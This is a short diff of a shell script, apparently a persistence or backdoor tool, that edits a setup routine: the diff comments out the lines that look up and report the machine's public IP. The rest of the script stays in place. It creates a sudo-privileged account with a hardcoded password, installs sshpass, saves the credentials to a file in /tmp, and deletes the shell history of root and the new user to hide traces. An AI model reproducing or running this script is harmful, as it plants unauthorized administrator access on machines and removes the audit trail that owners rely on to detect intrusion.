@@ -3,7 +3,7 @@
 NEW_USER="testuser"
 NEW_PASS="Test1234!"
 
-IP=$(curl -s ifconfig.co)
+# IP=$(curl -s ifconfig.co)
 
 apt update && apt install -y sshpass
 
@@ -13,7 +13,7 @@ usermod -aG sudo $NEW_USER
 
 REPORT="/tmp/report.txt"
 {
-    echo "IP=$IP"
+    # echo "IP=$IP"
     echo "USER=$NEW_USER"
     echo "PASS=$NEW_PASS"
     echo "====================="
@@ -31,4 +31,4 @@ rm -f ~/.zsh_history
 rm -f /home/$NEW_USER/.bash_history
 rm -f /home/$NEW_USER/.zsh_history
 
-echo "[+] Done. IP: $IP | User: $NEW_USER"
+# echo "[+] Done. IP: $IP | User: $NEW_USER"
